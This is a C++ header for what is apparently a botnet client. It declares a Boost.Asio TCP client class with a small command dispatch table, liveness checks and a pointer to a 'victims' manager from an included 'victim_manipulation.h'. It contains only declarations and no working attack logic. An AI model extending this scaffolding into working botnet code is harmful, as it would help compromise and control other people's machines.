#ifndef BOTNET_CLIENT_CLIENT_H
#define BOTNET_CLIENT_CLIENT_H

#include <unistd.h>

#include <algorithm>
#include <boost/asio.hpp>
#include <boost/asio/io_context.hpp>
#include <boost/bind/bind.hpp>
#include <chrono>
#include <cstdint>
#include <future>
#include <iostream>
#include <memory>
#include <optional>
#include <unordered_map>
#include <vector>

#include "msg_parser.h"
#include "session.h"
#include "victim_manipulation.h"

namespace io = boost::asio;
using tcp = io::ip::tcp;
using err = boost::system::error_code;

class client {
    public:
	enum command_code {
		eARE_YOU_ALIVE,
		eCOMMAND_NOT_FOUND,
	};

	client(io::io_context &, std::uint16_t, std::string, std::uint16_t, victims *);
	void start();

    private:
	void handleResponse(std::string &, session *);
	void handleAlive(std::vector<std::string> &, session *);

	void accept();
	void onAccept(err error_code);

	std::unordered_map<std::string, std::function<void(std::vector<std::string> &, session *)>> commands_;

	io::io_context &io_context;
	tcp::acceptor acceptor;
	std::optional<tcp::socket> socket_;
	std::string server_ip_;
	std::uint16_t server_port_;
	std::vector<std::shared_ptr<session>> tmp_vect_for_session_;
	msg_parser msg_parser_;
	victims *victims_;
};

#endif	// BOTNET_CLIENT_CLIENT_H
